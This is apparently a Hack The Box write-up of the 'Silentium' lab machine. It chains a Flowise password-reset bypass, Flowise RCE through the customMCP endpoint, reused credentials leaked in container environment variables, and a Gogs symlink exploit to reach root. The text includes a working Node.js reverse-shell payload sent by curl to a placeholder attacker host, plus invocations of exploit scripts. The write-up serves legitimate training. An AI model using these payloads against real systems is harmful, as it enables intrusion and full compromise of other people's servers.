# HTB: Silentium

**Machine Write-up**

## Executive Summary

Silentium is a Linux machine that tests web application security, container post-exploitation, and internal network pivoting.

The attack chain consists of four phases: subdomain enumeration to discover a staging Flowise instance, authentication bypass via **CVE-2024-31621** to gain admin access, RCE via **CVE-2025-24032** to get a shell inside a Docker container, and finally privilege escalation via **CVE-2025-8110** (Gogs symlink bypass) to achieve root.

---

## Phase 1: Reconnaissance & Enumeration

### Network Scanning

An initial nmap scan revealed two open ports:

- Port 22 — OpenSSH 9.6p1 (Ubuntu)
- Port 80 — nginx 1.24.0

```bash
nmap <Machine_IP> -sV -sC -O

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp open  http    nginx 1.24.0
```

### VHost & Subdomain Enumeration

Directory brute-forcing on `http://silentium.htb/` returned no significant endpoints. Virtual host enumeration was conducted using gobuster:

```bash
gobuster vhost -u http://silentium.htb \
  -w /usr/share/wordlists/dirb/common.txt \
  --append-domain --exclude-length 166

[+] staging.silentium.htb Status: 200
```

![Figure 1 — Flowise staging login portal](images/fig1-flowise-signin.png)
*Figure 1 — Flowise staging login portal (staging.silentium.htb/signin), confirming the exposed authentication endpoint discovered via virtual host enumeration.*

Navigating to `http://staging.silentium.htb/api/v1/version` exposed the backend: Flowise v3.0.5.

---

## Phase 2: Initial Foothold — Flowise Exploitation

### Email Enumeration & Authentication Bypass (CVE-2024-31621)

Researching Flowise versions below 3.0.5 indicated a known authentication bypass flaw via the password reset functionality (CVE-2024-31621 / Missing Authentication for Critical Function). However, the exploit requires a valid registered email address.

By analyzing the main page `http://silentium.htb`, developer names were gathered from the leadership section (Marcus Thorne, Ben, Elena Rossi).

![Figure 2 — Leadership section](images/fig2-leadership-section.png)
*Figure 2 — Leadership section on the main site containing employee names used during account enumeration.*

Using Burp Suite to fuzz the password reset endpoint `/api/v1/account/forget-password`, a clear username enumeration behavior was noticed. Random user strings returned an error, while injecting `ben@silentium.htb` yielded a successful `201 Created` server response containing a `tempToken`.

![Figure 3 — Burp Suite password-reset request/response](images/fig3-burp-password-reset.png)
*Figure 3 — Burp Suite request/response pair showing the password-reset API returning a temporary token for ben@silentium.htb.*

### Password Reset & Admin Access

Using the public exploit `52557.py`, the admin password for `ben@silentium.htb` was successfully reset:

```bash
python3 52557.py -e ben@silentium.htb -p MyNewPassword123! \
  -u http://staging.silentium.htb

[x] Password changed
```

![Figure 4 — Flowise admin dashboard](images/fig4-flowise-dashboard.png)
*Figure 4 — Authenticated access to the Flowise admin dashboard (Chatflows page), confirming successful exploitation of the password-reset bypass.*

### Remote Code Execution (CVE-2025-24032)

After logging in, the `DefaultKey` API key was retrieved from `/apikey`. Flowise v3.0.5 handles server configurations via the Model Context Protocol (MCP). The `/api/v1/node-load-method/customMCP` endpoint does not sanitize input, allowing injection of arbitrary Node.js code via the `mcpServerConfig` parameter.

```bash
curl -X POST http://staging.silentium.htb:80/api/v1/node-load-method/customMCP \
-H "Content-Type: application/json" \
-H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
-d '{
"loadMethod": "listActions",
"inputs": {
"mcpServerConfig": "({x:(function(){
const cp = process.mainModule.require(\"child_process\");
const net = process.mainModule.require(\"net\");
const sh = cp.spawn(\"/bin/sh\",[]);
const client = new net.Socket();
client.connect(<Attacker_PORT>,\"<Attacker_IP>\",function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return 1;
})()})"
}
}'
```

Listener output:

```bash
nc -lvnp <Attacker_PORT>
listening on [any] <Attacker_PORT> ...
connect to [<Attacker_IP>] from (UNKNOWN) [<Machine_IP>] 59682
```

---

## Phase 3: Post-Exploitation & Lateral Movement

### Container Environment Inspection

The reverse shell landed inside a Docker container. Standard enumeration (mounts, capabilities) showed no obvious escape path. However, shell history (`.ash_history`) revealed a prior `env` command. Running it exposed sensitive credentials — notably `SMTP_PASSWORD=r04D!!_R4ge`, reused for the `ben` account over SSH.

```bash
~ # env
FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
SENDER_EMAIL=ben@silentium.htb
FLOWISE_USERNAME=ben
DATABASE_PATH=/root/.flowise
SMTP_PASSWORD=r04D!!_R4ge
SMTP_HOST=mailhog
LLM_PROVIDER=nvidia-nim
```

### SSH Lateral Movement to Host

Using `ben` / `r04D!!_R4ge` over SSH gained access to the host machine and retrieved `user.txt`:

```bash
ssh ben@<Machine_IP>
ben@<Machine_IP>'s password: r04D!!_R4ge
Welcome to Ubuntu 24.04.4 LTS
ben@silentium:~$ ls
user.txt

ben@silentium:/opt/gogs/gogs/custom/conf$ cat app.ini
BRAND_NAME = Gogs
RUN_USER = root
RUN_MODE = prod
[server]
HTTP_ADDR = 127.0.0.1
HTTP_PORT = 3001
DOMAIN = staging-v2-code.dev.silentium.htb
ROOT_URL = http://staging-v2-code.dev.silentium.htb/
DISABLE_SSH = false
SSH_PORT = 22
```

---

## Phase 4: Privilege Escalation

### Internal Service Discovery — Gogs

System enumeration revealed a locally bound Git service: Gogs v0.13.3. The config at `/opt/gogs/gogs/custom/conf/app.ini` confirmed it ran on `127.0.0.1:3001` as root.

### SSH Local Port Forwarding

A local port forward tunnel was established to reach the internal service:

```bash
ssh -L 3001:127.0.0.1:3001 ben@<Machine_IP>
```

### Gogs Symlink Bypass — CVE-2025-8110

Gogs v0.13.3 is vulnerable to a repository symlink bypass (CVE-2025-8110) that allows an authenticated user to overwrite arbitrary system files. Exploitation steps:

- Register an account on `http://127.0.0.1:3001/user/sign_up`
- Run the public exploit script to inject a malicious symlink into a repository
- The script overwrites a root-owned config file and triggers command execution
- A root reverse shell is received on `<Attacker_PORT>`

```bash
python3 CVE-2025-8110.py \
  -u http://127.0.0.1:3001 \
  -lh <Attacker_IP> -lp <Attacker_PORT> \
  -user sami -pass sam

[+] Authenticated successfully
[+] Application token: 38fffa2074a9e9bbd4ffc1841bbe33827d1150d9
[+] Repo created: ab1d6e5ea634
[+] Malicious symlink pushed to repository
[*] Sending exploit payload...
[+] Exploit finished. Check your listener!
```

```bash
nc -lvnp <Attacker_PORT>
listening on [any] <Attacker_PORT> ...
connect to [<Attacker_IP>] from (UNKNOWN) [<Machine_IP>] 47196
root@silentium:~# id
uid=0(root) gid=0(root) groups=0(root)
root@silentium:~# ls /root
root.txt
```

---

## CVEs & Techniques Summary

| CVE | Vulnerability | Impact |
|---|---|---|
| CVE-2024-31621 | Flowise auth bypass (password reset) | Admin access to Flowise dashboard |
| CVE-2025-24032 | Flowise RCE via customMCP endpoint | Shell inside Docker container as root |
| CVE-2025-8110 | Gogs symlink bypass (repo write) | Root shell on host machine |
